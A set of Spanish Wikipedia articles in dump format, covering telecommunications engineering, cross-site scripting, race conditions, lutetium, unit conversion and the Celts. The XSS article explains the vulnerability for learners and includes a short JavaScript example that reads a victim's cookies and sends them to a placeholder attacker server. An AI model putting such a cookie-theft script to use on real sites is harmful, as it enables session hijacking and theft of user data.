- Caracterización y utilización de componentes electrónicos (transistores, diodos, circuitos integrados, microprocesadores) 

- Diseño y producción de circuitos para aplicaciones en electrónica profesional y de consumo

- Programación y verificación de sistemas y productos electrónicos para las tecnologías de la información y la comunicación (teléfonos móviles, 
televisión digital terrestre, ordenadores...)

- Diseño y operación de sistemas de medición automatizados, análisis de señales y control de instalaciones y equipos

El grado con itinerario en telemática estudia:

- La planificación, desarrollo y gestión de proyectos para el diseño, concepción, despliegue y explotación de redes, redes de comunicación basadas en 
ordenadores, servicios y aplicaciones de telecomunicaciones.

- Diseño, operación, implementación y gestión de redes de comunicación públicas y privadas (en general, servicios y aplicaciones basadas en redes 
telemáticas)

- Especificación, diseño, desarrollo, mantenimiento y despliegue de elementos de conmutación y protocolos para la interconexión de usuarios a través 
de diferentes medios de transmisión. 

El grado con itinerario en sonido e imagen estudia:

- La planificación, desarrollo y gestión de proyectos para el diseño, concepción, despliegue y explotación de redes, servicios y aplicaciones de 
telecomunicaciones

- El análisis, especificación, diseño y mantenimiento de sistemas y equipos de audio y video, así como el uso de técnicas y herramientas de 
procesamiento de audio y video para para codificar, transmitir, recibir y procesar información en cualquier medio (internet, comunicaciones móviles, 
redes físicas)

- El diseño de salas de producción y grabación de audio y video.

- El diseño de control de ruido y control de vibraciones, así como la caracterización del ruido ambiental. 

- El diseño de sistemas de aislamiento acústico y de transductores electroacústicos

Las titulaciones de Ingeniería de Telecomunicación deben reunir una serie de competencias específicas con objeto de capacitar a sus estudiantes para ejercer la profesión regulada de Ingeniero Técnico de Telecomunicación 

Algunas de las asignaturas estudiadas en el grado son las siguientes: 



Sistemas de Telecomunicación


Telemática


Sistemas Electrónicos


Sonido e Imagen


Obviando posibles predecesores en la mitología griega, la mensajería a caballo y las señales de humo, la Ingeniería de Telecomunicación tal y como se concibe actualmente empezó con la telegrafía. Desde sus inicios ha estado profundamente unida a la electrónica de señal.

Estos son algunos hitos históricos en los que ha sido determinante la ingeniería de Telecomunicación, acontecidos la gran mayoría en el siglo XX, contribuyendo a la era digital:


En los últimos años y aprovechándose del desarrollo en el campo de la informática, ha experimentado un auge muy notable, inventando nuevas ramas basadas en los sistemas digitales de emisión y recepción, como la telemática y la telefonía móvil. La penetración de las tecnologías de la información y la comunicación (TIC) a nivel mundial sigue imparable, aunque de forma desequilibrada en los continentes, con 4 000 millones de suscripciones a la telefonía móvil, 1 300 millones a líneas fijas y cerca de un cuarto de la población a internet.

La regulación en España se establece a través de varias normativas. La Orden CIN/355/2009 establece los requisitos de los planes de estudios que conducen a esta profesión. Los estatutos del Colegio Oficial de Ingenieros de Telecomunicación establecen la colegiación como requisito indispensable para su ejercicio en España.

Los ingenieros de telecomunicación tienen atribuciones para la firma de proyectos y direcciones de obra, tanto en el ámbito civil como en la edificación. Los proyectos más habituales firmados por ingenieros de telecomunicación son los relacionados con las infraestructuras para el despliegue de redes de telecomunicaciones en dominio público y privado, así como todos los relacionados con el uso del espectro radioeléctrico.

En las áreas culturales influidas por la tradición cristiana, el santo patrón de los ingenieros de telecomunicación, del telégrafo, del teléfono, de la radio y de la televisión es el arcángel Gabriel, cuya festividad se festeja cada 29 de septiembre. San Gabriel, que además es patrón de los servicios diplomáticos, filatélicos y radiólogos, es patrón de las telecomunicaciones desde que el 12 de enero de 1951 Pio XII nombrase al ángel patrón de la radio y las comunicaciones.




</doc>
<doc id="6415" url="https://es.wikipedia.org/wiki?curid=6415" title="Cross-site scripting">
Cross-site scripting

XSS, del inglés Cross-site scripting es un tipo de inseguridad informática o agujero de seguridad típico de las aplicaciones Web, que permite a una tercera persona inyectar en páginas web visitadas por el usuario código JavaScript o en otro lenguaje similar (ej: VBScript), evitando medidas de control como la Política del mismo origen.

Es posible encontrar una vulnerabilidad de Cross-Site Scripting en aplicaciones que tengan entre sus funciones presentar la información en un navegador web u otro contenedor de páginas web. Sin embargo, no se limita a sitios web disponibles en Internet, ya que puede haber aplicaciones locales vulnerables a XSS, o incluso el navegador en sí.

XSS es un vector de ataque que puede ser utilizado para robar información delicada, secuestrar sesiones de usuario, y comprometer el navegador, subyugando la integridad del sistema. Las vulnerabilidades XSS han existido desde los primeros días de la Web.

Esta situación es usualmente causada al no validar correctamente los datos de entrada que son usados en cierta aplicación, o no sanear la salida adecuadamente para su presentación como página web.

Esta vulnerabilidad puede estar presente de las siguientes formas:


Supongamos que un sitio web tiene la siguiente forma:

y que al acceder se creará un documento HTML enlazando con un frame a menu.asp.

En este ejemplo, ¿qué pasaría si se pone como URL del frame un código javascript? 

Si este enlace lo pone un atacante hacia una víctima, un visitante podrá verlo y verá que es del mismo dominio, suponiendo que no puede ser nada malo y de resultado tendrá un bucle infinito de mensajes.

Un atacante en realidad trataría de colocar un script que robe las cookies de la víctima, para después poder personificarse como con su sesión, o hacer automático el proceso con el uso de la biblioteca cURL o alguna similar. De esta forma, al recibir la cookie, el atacante podría ejecutar acciones con los permisos de la víctima sin siquiera necesitar su contraseña. 

Otro uso común para estas vulnerabilidades es lograr hacer phishing. Quiere ello decir que la víctima ve en la barra de direcciones un sitio, pero realmente está en otra. La víctima introduce su contraseña y se la envía al atacante.

Una página como la siguiente:
es probablemente vulnerable a XSS indirecto, ya que si escribe en el documento "Usuario Inválido", esto significa que un atacante podría insertar HTML y JavaScript si así lo desea.

Por ejemplo, un tag como codice_1 que ejecute código javascript, cree otra sesión bajo otro usuario y mande la sesión actual al atacante.

Para probar vulnerabilidades de XSS en cookies, se puede modificar el contenido de una cookie de forma sencilla, usando el siguiente script. Sólo se debe colocar en la barra de direcciones, y presionar 'Enter'.

Funciona localizando puntos débiles en la programación de los filtros de HTML si es que existen, para publicar contenido (como blogs, foros, etc.). 

Normalmente el atacante tratara de insertar tags como <iframe>, o <script>, pero en caso de fallar, el atacante puede tratar de poner tags que casi siempre están permitidas y es poco conocida su capacidad de ejecutar código. De esta forma el atacante podría ejecutar código malicioso.

Ejemplos:

Una posibilidad es usar atributos que permiten ejecutar código.

Usar AJAX para ataques de XSS no es tan conocido, pero sí peligroso. Se basa en usar cualquier tipo de vulnerabilidad de XSS para introducir un objeto XMLHttp y usarlo para enviar contenido POST, GET, sin conocimiento del usuario.

Este se ha popularizado con gusanos de XSS que se encargan de replicarse por medio de vulnerabilidades de XSS persistentes (aunque la posibilidad de usar XSS reflejados es posible).

El siguiente script de ejemplo obtiene el valor de las cookies y seguidamente las enviaría al atacante.

Javascript:
var cookiesDeUsuario = document.cookie;

var xhr = new XMLHttpRequest(); // Objeto Ajax
xhr.open('GET', 'www.servidor-atacante.com/cookies.php');
xhr.send('c=' + cookiesDeUsuario);
PHP (servidor del atacante):



</doc>
<doc id="6417" url="https://es.wikipedia.org/wiki?curid=6417" title="Condición de carrera">
Condición de carrera

Condición de carrera o condición de secuencia (del inglés "race condition") es una expresión usada en electrónica y en programación.
Cuando la salida o estado de un proceso es dependiente de una secuencia de eventos que se ejecutan en orden arbitrario y van a trabajar sobre un mismo recurso compartido, se puede producir un "bug" cuando dichos eventos no «llegan» (se ejecutan) en el orden que el programador esperaba. El término se origina por la similitud de dos procesos «compitiendo» en carrera por llegar antes que el otro, de manera que el estado y la salida del sistema dependerán de cuál «llegó» antes, pudiendo provocarse inconsistencias y comportamientos impredecibles y no compatibles con un sistema determinista.
En determinados escenarios, la gran velocidad de ejecución de un hilo no es suficiente para garantizar que operaciones concurrentes den resultados esperados. Se pueden dar condiciones de carrera a nivel de proceso o incluso a nivel de sistema cuando este está distribuido.

A modo de ejemplos de alto nivel: un sistema mal diseñado de reserva de entradas podría ocasionar que dos usuarios accediendo desde la web a la vez, reserven legítimamente la misma butaca. O un sistema de conteo automático de plazas libres de una playa de estacionamiento en sus barreras de entrada y salida de vehículos podría indicar que está totalmente vacío cuando realmente está lleno (o viceversa). De igual forma, dos personas ingresando y retirando efectivo a la vez de una misma cuenta bancaria podrían ver su saldo incrementado o por el contrario su ingreso realizado pero no materializado en saldo disponible.
Si bien son situaciones que pudieran ser improbables, son posibles y pueden ser y han de ser evitadas en el desarrollo de software.

Si los procesos que están en condición de carrera son correctamente sincronizados, todo debería funcionar correctamente, por lo que el resultado será el esperado. Múltiples procesos se encuentran en condición de carrera si el resultado de los mismos depende del orden de su llegada y si no son correctamente sincronizados, puede producirse una corrupción de datos, que puede derivar incluso en un problema de seguridad del sistema capaz de ser explotado de forma malintencionada. Análogamente, en circuitos electrónicos se da una condición de carrera cuando la salida de un sistema o subsistema depende del orden en que se hayan mandado las solicitudes de activación o desactivación de sus componentes.

La naturaleza imprevisible de las condiciones de carrera da lugar en muchas ocasiones a la aparición de bugs de manera repentina que normalmente no ocurren durante el testeo de un software. Además, pueden ser difícilmente trazables, difícilmente replicables de manera controlada o visibles incluso con herramientas de "debugging".




</doc>
<doc id="6421" url="https://es.wikipedia.org/wiki?curid=6421" title="Lutecio">
Lutecio

El lutecio es un elemento químico, de número atómico 71, cuyo símbolo químico es Lu. A pesar de ser uno de los elementos del bloque d, con frecuencia aparece incluido entre los lantánidos (tierras raras), ya que con éstos comparte muchas propiedades. De todos ellos es el elemento más difícil de aislar, lo cual justifica su carestía y los relativamente pocos usos que se le han encontrado.

El lutecio es un metal trivalente, de color blanco plateado, resistente a la corrosión y, en presencia de aire, relativamente estable. De todas las tierras raras es el elemento más pesado y duro.

Este metal se emplea como catalizador en el craqueo del petróleo en las refinerías, y en diversos procesos químicos, como alquilación, hidrogenación y polimerización. 
También se están investigando radioisótopos de lutecio para ser aplicados en medicina nuclear en tratamientos terapéuticos.

El lutecio, del latín "Lutetia" (primer nombre de París), fue descubierto de forma independiente en 1907 por el científico francés Georges Urbain y el mineralogista Carol Auer von Welsbach. Ambos investigadores lo encontraron como impureza del metal iterbio, que el químico suizo Jean Charles Galissard de Marignac y la mayoría de sus colegas habían considerado mineral puro.

La separación del lutecio -del iterbio de Marignac- fue descrita por vez primera por Urbain. Prevaleció el nombre que éste asignó al nuevo elemento descubierto. Urbain había elegido los nombres neoiterbio (para el iterbio) y lutecio. Welsbach optó por designarlos aldebaranio y casiopeo. En 1949 se decidió conservar el nombre iterbio y llamar lutecio al ser nuevo elemento. En el seno de la comunidad científica alemana, al elemento 71 aún se le conoce como "Cassiopium".

En la naturaleza se encuentra con la mayoría del resto de tierras raras, pero nunca en solitario, nativo. De todos los elementos presentes en la naturaleza es el menos abundante. La principal mena de lutecio comercialmente explotable es la monacita (Ce, La, etc.)PO, que contiene 0,003% de Lu.

Hasta finales del no se logró obtener el metal puro, ya que es extremadamente difícil de preparar. El procedimiento empleado es el intercambio iónico (reducción) de LuCl o de LuF anhidro con metal alcalino o con metal alcalinotérreo.

De lutecio existe un isótopo estable, Lu-175, con abundancia natural de 97,41%. Se han identificado 33 radioisótopos. Los más estables son el Lu-176, con periodo de semidesintegración de 3,78×10 años y abundancia natural de 2,59%, el Lu-174, con periodo de semidesintegración de 3,31 años, y el Lu-173, de 1,37 años. Los periodos de semidesintegración del resto de sus isótopos radiactivos son inferiores a nueve días; la mayoría, de menos de media hora. Además existen 18 metaestados, de los cuales los más estables son: Lum-177, Lum-174 y Lum-178, cuyos periodos de semidesintegración respectivos son 160,4 días, 142 días y 23,1 minutos.

Las masas atómicas de los isótopos de lutecio varían entre 149,973 uma, del Lu-150, y 183,962, del Lu-184. La principal modalidad de desintegración de los isótopos más ligeros que el estable es por captura electrónica (ε), (con algunos casos de desintegración α), de lo cual se generan isótopos de iterbio. Los isótopos más pesados que el estable se desintegran mediante emisión β, cuyo resultado consiste en isótopos de hafnio.

Al igual que el resto de las tierras raras, se supone que la toxicidad de este metal es baja. No obstante, tanto el lutecio como -especialmente- sus compuestos deben manejarse con precaución máxima. Aunque en el cuerpo humano no desempeña función biológica alguna, se cree que estimula el metabolismo.




</doc>
<doc id="6422" url="https://es.wikipedia.org/wiki?curid=6422" title="Conversión de unidades">
Conversión de unidades

La conversión de unidades es la transformación del valor numérico de una magnitud física, expresado en una cierta unidad de medida, en otro valor numérico equivalente y expresado en otra unidad de medida de la misma naturaleza.

Este proceso suele realizarse con el uso de los factores de conversión y/o las tablas de conversión de unidades.

Frecuentemente basta multiplicar por una fracción (factor de una conversión) y el resultado es otra medida equivalente, en la que han cambiado las unidades.
Cuando el cambio de unidades implica la transformación de varias unidades, se pueden utilizar varios factores de conversión uno tras otro, de forma que el resultado final será la medida equivalente en las unidades que buscamos.

Por ejemplo, para pasar 8 metros a yardas, sabiendo que un metro equivale a 1,093613 , se multiplica 8 por 1,093613; lo que da por resultado 8,748904 yardas.


</doc>
<doc id="6426" url="https://es.wikipedia.org/wiki?curid=6426" title="1821">
1821



















</doc>
<doc id="6427" url="https://es.wikipedia.org/wiki?curid=6427" title="Celta">
Celta

Celtas (del griego, Κέλτoι "keltoi") es el término utilizado por lingüistas e historiadores para describir, en un sentido amplio, al pueblo o conjunto de pueblos de la Edad de Hierro que hablaban lenguas celtas, una de las ramas de las lenguas indoeuropeas. En este sentido, el término no es por lo tanto étnico ni arqueológico, pues muchos de los pueblos que hablaron lenguas célticas, caso de los Goidelos de Irlanda, nunca llegaron a participar de las corrientes culturales materiales de Hallstatt o La Tène. 

Existe sin embargo un concepto más restringido del término, referido en este caso a los llamados celtas históricos, entendidos estos tradicionalmente como el grupo de sociedades tribales de Europa, que compartieron una cultura material iniciada en la primera Edad de Hierro (1200-400 a. C.) en torno a los Alpes (periodo Hallstatt) y más tarde en el hierro tardío (periodo La Tène), y que fueron así llamados por los geógrafos griegos y latinos. En este grupo se adscriben los celtas continentales de la Galia, norte de Italia, Alemania y Bohemia, los celtíberos de Iberia, los gálatas de Anatolia, este y centro de Rumanía y, ya con mayores reticencias por parte de los historiadores británicos e irlandeses, los celtas insulares. 

En tiempos antiguos los celtas que llegaron a lo largo del primer milenio, hacia el 1200 a. C. a Europa y según el punto de vista tradicional, hacia el 900 a. C. en la península ibérica, eran un cierto número de pueblos interrelacionados entre ellos que habitaban en Europa Central; todos estos pueblos hablaban lenguas indoeuropeas, indicativo de un origen común. Hoy, el término "celta" se utiliza a menudo para describir a la gente, las culturas y lenguas de muchos grupos étnicos de las islas británicas, Francia en la región de Bretaña, España, en Galicia, Cantabria y Asturias, y Portugal en la región de Minho. Sin embargo, tribus o naciones, como los atrébates, Menapii, y Parisii, desde regiones celtas de tierra firme, incluyendo la Galia y Bélgica, se sabe que se movieron hacia Gran Bretaña e Irlanda y contribuyeron al crecimiento de aquellas poblaciones. El uso del término celta para referirse a gente de Irlanda y Gran Bretaña surge en el siglo XVIII. Vivían en pueblos amurallados llamados castros.

Los griegos los llamaron primeramente "hiperbóreos"; después fueron llamados keltoi o gente oculta, que proviene del griego Hecateo de Mileto del 517 a. C.

No se puede hablar de un Estado propiamente celta, ya que cada zona tenía su líder, y siendo los celtas un pueblo guerrero como eran, siempre había rivalidades entre ellos.

Hoy se considera que los celtas forman parte de los grupos indoeuropeos. Se piensa que parte de los hablantes de esta familia lingüística, procedentes de Anatolia o de las estepas entre el mar Negro y el mar Caspio, emigraron rumbo a Europa, mientras otras ramas se desplazaron hacia Irán y la India. 

El término 'celtas' se usa en diferentes sentidos, por lo que resulta multívoco y ambiguo. Sólo con cautela puede usarse para referirse a entidades étnicas anteriores al siglo V a. C., momento en que Heródoto se refiere explícitamente a estos grupos. Antes de esa fecha es incierto hasta qué punto pudo existir una etnicidad celta identificable. Aunque claramente el proto-celta sería más antiguo que Heródoto, es complicado saber si los pueblos de la Edad del Hierro (lo que podría asimilarse con Hallstatt) hablaban o no lenguas celtas. Aunque existen argumentos para suponer que en esa cultura se encontrarían antecesores de los celtas, la identificación con pueblos propiamente celtas es muy insegura.

Actualmente 'celta' es esencialmente un concepto lingüístico, pero su uso exige precaución. Gonzalo Ruiz Zapatero ha llamado la atención sobre el intento de la precisión del término que en realidad es algo más engañoso, complejo y amplio. Hubo muchos pueblos celtas diferentes; salvo por el parentesco filogenético de sus lenguas es difícil señalar con certeza factores comunes específicamente celtas. Aunque algunos autores hablan de los celtas como un pueblo homogéneo y bien definido, la realidad material de los hablantes de lenguas descendientes del proto-celta, muy probablemente, era más compleja, no existiendo quizá la homogeneidad que algunos autores les atribuyen.

Este concepto se ha ido creando poco a poco a lo largo del tiempo y la historia con diferentes fines, por ello es tan multívoco. Este proceso tiene tres fases muy importantes: 

El historiador latino Avieno recoge en su "Ora Maritima" un texto en torno al 520 a. C., también hablan sobre ello Heródoto y Hecateo de Mileto por el 500 a. C. En torno a esa fecha se sitúa a la Céltica en la zona alpina y el norte. El término "keltoi" es un nombre que los griegos conocieron oralmente de los indígenas, una transcripción fonética. Este término junto a "keltiké" nos da una ambigua referencia geográfica. Hay que tomarlo simplemente como un nombre dado a los habitantes al norte de los Alpes. Vemos la información geográfica aportada por Heródoto aquí: 

Más tarde, con César, Posidonio y demás, se convierte esta información geográfica en una de ámbito etnográfico. Sin embargo es una información limitada que no se puede extender ni geográfica ni cronológicamente. Una de las fuentes historiográficas puede ser la lingüística, para la cual las lenguas célticas son una rama de la familia indoeuropea. Gracias a este concepto lingüístico podemos trazar ciertos límites.

En cuanto a la celtomanía, los druidas siempre fueron un tema de interés y fascinación pero de los druidas históricos apenas se conoce nada. Muchos monumentos megalíticos de la prehistoria se han intentado relacionar con estos personajes y la cultura céltica, lo cual resulta muy dudoso y aventurado. Un punto importante, y de cambio, supondrá el hallazgo de La Tène. La cultura celta irá unida a una cultura material específica de este yacimiento.

En esta etapa el término tiene una aplicación más clara. Los autores van aceptando las periodizaciones de La Tène en sus territorios de estudio. El camino para consolidarlo es el filológico. En última instancia, aún no se ha conseguido delimitar un territorio. En cuanto a la península Ibérica, los primeros intentos de identificación celta corrieron a cargo de Rubio de la Serna. Ciertas zonas peninsulares, como la gallega, han intentado identificarse con lo celta para reforzar su identidad nacional. Algo ciertamente lógico debido al tangible patrimonio heredado a través de los siglos que no sólo se restringe a una presencia arqueológica ingente -la más extensa de toda Europa-sino a una verdadera inercia cultural que pervive actualmente con vigor y que no sólo busca en lo celta un signo de diferenciación. A pesar de ello hubo que esperar a Martín Almagro Basch y Pedro Bosch Gimpera para que se aclarase la presencia celta en España.

Es posible que grupos celtas estuviesen presentes en territorios peninsulares, a partir de la II Edad del Hierro. Colin Renfrew, en "Arqueología y Lenguaje", ha resumido ocho puntos que podrían configurar lo céltico. Estos puntos han dado paso a un nuevo momento sobre la concepción de lo celta.

Como se ha mencionado anteriormente, Renfrew elabora una lista que podría configurar el concepto de celta. Estos ocho puntos son formulados en el libro "Arqueología y Lenguaje" de Renfrew y han tenido mucha influencia en el mundo académico.

Hecateo de Mileto los sitúa cerca de Massalia, Heródoto desde el nacimiento del Rin hasta las Columnas de Hércules y Rufo Festo Avieno en costa atlántica. De ello sacamos que la "keltiké" estaría al norte de Alpes y al Occidente del continente y que "keltoi" es un nombre que reciben los griegos de forma oral.

Hay que entender primero que es un "ethnos", una autoconciencia de lo que es un grupo y que se da un nombre (etnónimo). Según César, se emplea "galli" y "keltoi" indistintamente en la Galia y sólo "celtae" es registrado en la tercera parte de Francia. Sugiere que no hay una sola etnicidad. Estrabón nos habla de la falta de evidencias de que se llamen en Gran Bretaña e Irlanda celtas o galos a sí mismos. También habla de los "keltiberi" en la península ibérica. En consecuencia, el término tiene un carácter más restrictivo que en textos anteriores, en relación al avance del conocimiento.

Gente que habla lengua celta y por ello han quedado fijados como grupo lingüístico por investigadores modernos. En un principio, en el siglo XVII, se estudia la variabilidad de lenguas mundiales y al siglo siguiente se ve la relación de la lengua celta y gala en la época clásica. Más tarde se establece su dependencia con el indoeuropeo. Se puede clasificar como dos tipos de lengua, la celta Q y la P, en función del tratamiento de las "labiovervales oclusivas". También se distinguirán por su situación, continentales (Europa continental en la antigüedad) e insulares (islas británicas en la Edad Media).

Augustus Wollaston Franks en 1863 acuña el término "late celtic", atribuyendo el material del hierro tardío a celtas históricos, esbozando el contenido étnico de La Tène. En 1872 Hans Hildebrand subdivide la Edad del Hierro en Hallstatt y La Tène, estableciendo celtas = cultura de La Tène. En 1885 Otto Tischler subdivide Hallstatt en 2 y La Téne en 3. Paul Reinecke añade una fase inicial a La Téne. En 1913 Joseph Dechelette define el concepto "laténico" superponiendo conceptos cronológicos, tipológicos y culturales. 

Poco a poco se va a reconocer una cuna céltica en Centroeuropa. Se crean dos tradiciones, la francesa o tradicional que se refiere a celtas centroeuropeos y la anglosajona que engloba a los insulares.

El arte laténico se identifica con el céltico por la fórmula celtas = La Téne. Destacan los torques y los cascos. Queda reflejado ese estilo también en las monedas. Controvertido es el caso del caldero de Gundestrup, parecido al arte celta pero que parece pertenecer a tracios o dacios. Tampoco todas las regiones de habla celta coinciden su arte con el laténico.

Atribución de ciertas virtudes y características a los celtas como es la independencia, el heroísmo, la arrogancia… Los clásicos les darán estas virtudes características a través de sus textos. Estrabón y Diodoro Sículo remarcan este espíritu, resaltando sus particularidades. Otro texto de Flavio Arriano sobre una reunión entre Alejandro Magno y galos también lo pone de relieve, así como Polibio en la batalla de Telamón. Aquí nos sirve el fragmento de Polibio sobre dicha batalla para poner de relieve ese espíritu:

Se llama celta a este arte como también se habla de la Iglesia celta. Los modelos estéticos celtas perviven. El cristianismo llega en el siglo V con Patricio. Gracias al latín se aprende la cultura antigua. En las recopilaciones de textos se aprecia el arte celta en sus miniaturas, como en los libros de Durrow y de Kells. Hoy en día esta cultura pervive. En cuanto a la literatura, se conservarán algunos ciclos como el de Ulster y el de Finn.

En el siglo XVI algunos eruditos ingleses y franceses se vanagloriaban de descender de los celtas, en particular de los druidas. Se empiezan a atribuir los monumentos megalíticos al celtismo, iniciándose una celtomanía. Se va sobreponiendo una visión romántica a la que contribuye un texto de Plinio el Viejo sobre los druidas. Aquí está el texto que ha ido desdibujando la forma originaria de los druidas en una más romántica:

Hoy en día, cierta retórica que apela a lo céltico se utiliza con fines políticos, para reforzar las identidades nacionales. Se ve con Boudica en Inglaterra, Vercingetórix en Francia, Viriato en Portugal, Breogán y Numancia en España. En especial invenciones como es el "espíritu celta" o la "herencia celta". Por tanto, según Ruiz Zapatero lo celta es en gran parte, lo que ha sido inventado a partir de la información arqueológica y los datos de fuentes clásicas y medievales, sumando representaciones imaginarias.

El término celta "(keltoi)" es de origen griego, quienes pudieron haberlo tomado prestado de iberos o ligures. Los celtas probablemente se llamaban a sí mismos "*gal-", o sea: galos (derivados: gálata).

No se ha logrado discernir etnias propiamente celtas entre los primeros grupos de indoeuropeos que penetraron en la Europa central. Según el punto de vista tradicional, solo hasta el siglo V a. C. con el surgimiento de la cultura de La Tène es razonablemente seguro identificar a los portadores de esa cultura como hablantes de lenguas celtas. Desde un punto de vista igualmente tradicional, los primeros pobladores indoeuropeos podrían haber sido los portadores de la cultura de los campos de urnas que se propagaron rápida y extensamente por Europa hacia el siglo XIII a. C. Los portadores de esta cultura se expandieron descendiendo por la margen derecha del Ródano ocupando Languedoc, Cataluña y el bajo valle del Ebro. Otra línea de expansión les llevó a Bélgica y el sureste británico. 

Sin embargo, recientemente se ha asociado a los celtas o sus precursores inmediatos con la cultura del vaso campaniforme, que en el Neolítico medio se habría expandido desde la península ibérica, difundiéndose por el frente Atlántico hasta el centro de Europa (zona media del Elba). Al confluir así con la cultura de la cerámica cordada se habría constituido el primer horizonte cultural Paneuropeo, que algo más tarde desembocaría en la cultura del bronce en Unetice, cerca de Praga. El estudio aún más reciente de la distribución del haplotipo mitocondrial H, no solo es consistente con estas hipótesis, sino concluye que esta difusión, que parte del SO de Europa, habría supuesto un importante movimiento de población, y no solo la transmisión de un "paquete cultural".

A partir del siglo VIII a. C., otros pueblos presuntamente indoeuropeos fueron los portadores de la cultura de Hallstatt (Hierro I), extendiéndose en esta fase por el interior de la península ibérica (siglo VII a. C.) En el siglo VI a. C. los pueblos presuntamente indoeuropeos fueron desplazados del noreste ibérico a manos de los iberos, quedando así los celtas de Iberia aislados del resto de pueblos celtas continentales.

Desde el siglo IV a. C., los celtas continentales inauguran la cultura de La Tène, específicamente celta (Hierro II). En esta fase, los celtas acabaron de ocupar el norte y centro de Francia (la Galia), el norte de Italia, así como la mayor parte de las islas británicas. También se extendieron por los Balcanes, alcanzando incluso una comarca de Asia Menor, que será conocida como Galatia. En esta época se construyen importantes villas fortificadas (lat. "oppida"), que sirven de centros comerciales y políticos. Es también en este período cuando el druidismo se extiende entre los celtas. Contrariamente a lo que se cree, los druidas no tenían templos de piedra ni arqueológicamente se ha podido enlazar el druidismo celta con Stonehenge, siendo la cultura megalítica anterior en varios milenios a la cultura celta y al fenómero del druidismo. Este error de asociar la cultura megalítica atlántica (presente en las islas británicas, Francia y España) con Stonehenge está muy extendido entre la gente por ser un invento del romanticismo del siglo XVIII. Como ejemplo: los celtas ibéricos no conocieron el fenómeno druídico, pero en España hay muchos restos megalíticos. 

Una de las primeras menciones de los celtas, es la de los galos senones cisalpinos liderados por su rey Breno, que llegaron a invadir Roma en el 390 a. C. Posteriormente la república romana primero y el imperio romano después combatirían exitosamente a los galos cisalpinos y transalpinos. Julio César ya había luchado contra ellos durante su conquista de la Galia y, con el tiempo, los romanos les arrebataron también sus dominios británicos e ibéricos. A finales del Imperio romano (476 d. C), los celtas tan sólo ocupaban partes del noroeste de Francia, Irlanda, Gales y algunas zonas de Escocia. Durante el transcurso de la Edad Media, reforzaron su control de Escocia e hicieron varios intentos de ampliar su territorio en Inglaterra. A partir del siglo II a. C., los celtas acusan la creciente presión militar de los germanos por el norte y, algo después, la de los romanos por el sur. En pocas décadas toda la Galia está ocupada por los romanos. La presencia romana en Gran Bretaña fue de escasa duración, lo que permitió a las lenguas celtas de esta isla (galés) sobrevivir y, más tarde, regresar al continente (Bretaña francesa).

Todavía en el siglo VII los celtas llevaron a cabo su quizá última expansión: los escotos irlandeses invadieron Caledonia, región que pasó a ser llamada Escocia.

Entre los restos arqueológicos celtas destacan los castros y los petroglifos (nota: muchos petroglifos son mil años anteriores a la cultura celta, aunque se seguirán haciendo durante el periodo celta), que se encuentran con frecuencia en el noroeste de la península ibérica.

Los pueblos y cultura célticas tuvieron una fuerte presencia en el sudoeste de la península, documentada por Plinio el Viejo y otras fuentes. Según historiadores como Adolf Schulten el norte de la Península estaba habitado no por pueblos celtas sino por ligures.Además ellos lo que hoy conocemos como la Halloween se celebraba ya hace más de 3000 años por los celtas, un pueblo guerrero que habitaba zonas de Irlanda, Inglaterra, Escocia, Francia y Norte de España. Precisamente el 31 de octubre, los celtas celebraban el fin del verano y pensaban que los muertos salían de sus tumbas como zombis y para protegerse de ellos decoraban las casas con motivos siniestros.

Sin duda el principal rasgo definitorio de las etnicidades celtas es la lengua. Ya que el resto de aspectos históricos y culturales fueron más cambiantes, en tanto que la lengua es más estable frente al devenir histórico, a pesar que debido al cambio lingüístico las lenguas celtas fueron diversificándose en un proceso análogo al que llevó del latín a las lenguas románicas.

Las lenguas celtas derivan de un conjunto de dialectos del proto-indoeuropeo, idioma que cronológicamente ocupa una posición intermedia dentro de la familia indoeuropea. A partir de los rasgos comunes a las lenguas celtas mediante los métodos de la lingüística histórica se ha reconstruido del proto-celta que es una aproximación a la lengua madre que dio lugar por diversificación a las lenguas celtas históricamente conocidas.

La cultura celta está formada por tradiciones transmitidas de forma oral, destacando las historias incluidas en el Ciclo del Ulster, como el "cuento del cerdo de Mac Datho", la batalla de los bueyes de Cualinge o Bricriu.

Los autores griegos y romanos describen a los celtas como personajes jactanciosos y turbulentos, muy amigos de armar camorra. Esto era aún más cierto durante sus festines. Los festines eran una parte importante de la vida de la nobleza celta. A menudo se celebraban festines para celebrar la victoria en una batalla. Los guerreros tenían entonces la oportunidad de alardear de sus hazañas. Antes de trinchar la carne, tenían lugar una contienda verbal de bravuconería, para decidir quién era el guerrero más valiente de los presentes. Los contendientes para la obtención del título eran estimulados por sus defensores para exponer los alegatos más extravagantes. El vencedor era premiado con trinchar el animal asado, y reservarse para el la parte superior del músculo, llamada la “parte del campeón”.

La vestimenta de los celtas, tal y como ha sido reconstruida, muestra un estilo colorista y bien ornamentado, con mucha tendencia a la mezcla de colores llamativos. Los tintes principales, que tanto fervor causaron, seguramente eran: para el rojo, la llamada “Roja” ("Rubia tinctorum L."), para el amarillo Reseda luteola y para el azul, yerba pastel ("Isatis tinctoria"). El lino ha sido el material textil más antiguo hallado, usado por los proto-celtas. La lana se convirtió en la materia prima más usada una vez las ovejas fueron domesticadas. En la Edad de Hierro la mayoría de ropa de los celtas estaba hecha de lana. La tela se tejía con telares, a cuadros y rayas, pero más simples que el “tartán” actual. Las piezas de vestir básicas eran "braccae" para los varones y túnicas largas y peplum para las mujeres, así como un saquito en el cinturón (denominado pouch) para ambos.

Las casas estaban formadas por una armadura de postes de madera, ramas y mimbres entrelazados y embarrados, cubiertas de entramados de paja. Hoyos distribuidos alrededor de la vivienda, servían para almacenar los cereales. Las viviendas se encontraban dentro de cerros fortificados, como es el caso de Maiden, en Dorset.

La religión de los antiguos celtas, particularmente la de los galos antes de la conquista romana, no es bien conocida, y los datos de que se disponen para reconstruirla son escasos y no muy precisos.

El culto estaba a cargo de los druidas, sacerdotes que a la vez eran los educadores de la juventud. Los monumentos llamados "Piedras Druídicas", anteriores a la llegada de los celtas al oeste de Europa, parecen no haber representado ningún papel en la religión de los antiguos galos.

Durante mucho tiempo sólo existieron cultos locales especialmente relacionados con las montañas, los bosques y las aguas, a quienes se invocaba bajo diferentes nombres. Hallamos el dios Vosgos, la diosa Ardenas, el dios Dumias; las divinidades de las fuentes o de los ríos: Sequana (la fuente del Sena), Nemausis (la fuente de Nimes).

